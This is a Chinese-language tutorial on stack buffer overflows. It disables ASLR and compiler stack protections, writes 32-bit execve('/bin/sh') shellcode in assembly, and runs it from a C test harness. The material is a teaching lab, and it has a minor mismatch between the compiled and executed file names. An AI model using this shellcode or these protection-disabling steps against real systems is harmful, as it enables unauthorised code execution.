第一章节：缓冲区溢出，也是最基本最简单的一章。
做以上内容之前，首先要关掉一些系统自带的保护措施，例如 ASLR。
```shell
$sudo sysctl -w kernel.randomize_va_space=0
```
另外是编译器自带的栈保护机制：
```shell
$ gcc -fno-stack-protector example.c
$ gcc -z execstack -o example example.c   
```
另外是基本 shellcode 的编写，也就是启动 shell 的代码，在 C 语言中表示如下：
```c
#include <stdio.h>
int main() {
    execve("/bin/sh",0,0);
}                        
```
32 位系统采用 int 0x80 软中断触发系统调用，将中断号和相关寄存器的值传给调用函数。32 位linux 中断号可以在网站上查到，execve 调用号为 0x0b，那么就要将这个值传给 eax 寄存器。ebx指向进程字符串 "/bin/sh"，ecx 和 edx 均为 0.
```
global _start
_start:
  xor eax,eax	;eax置0
  push eax		;入栈作为字符串终止符
  push "//sh"	;字符串依次入栈
  push "/bin"
  mov ebx,esp	;ebx定位到栈顶，即字符串起始点
  mov ecx,eax	;ecx和edx均置0
  xor edx,edx
  mov al,0Bh	;al设为调用号0B
  int 80h			;触发软中断
```
将得到的汇编代码进行编译链接，之后反汇编得到字节码。
```shell
$ nasm -f elf32 shellcode.asm
$ ld -m elf_i386 -o shellcode shellcode.o
$ objdump -d shellcode
```
将得到的 shellcode 写入一个 c 文件，这样就可以启动一个新的 shell。
```c
// shellcode.c
// gcc -z execstack -o shellcode shellcode.c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

const char code[] =
"\x31\xc0"                   // xor    %eax,%eax
 "\x50"                      // push   %eax
 "\x68\x2f\x2f\x73\x68"      // push   $0x68732f2f
 "\x68\x2f\x62\x69\x6e"      // push   $0x6e69622f
 "\x89\xe3"                 //  mov    %esp,%ebx
 "\x89\xc1"                 //  mov    %eax,$ecx
 "\x31\xd2"                //   xor    %edx,%edx
 "\xb0\x0b"                //   mov    $0xb,%al
 "\xcd\x80"                //   int    $0x80
;

int main(int argc, char **argv){
  char buf[sizeof(code)];
  strcpy(buf, code);
  ((void(*)())buf)();
}
```
最后是编译执行。
```shell
$ gcc -z execstack -o shellcode shellcode.c
$ ./shell
```
另外，使用 pwntools 这一工具可以更简单地实现 shellcode 的制作，直接调用相应函数即可。
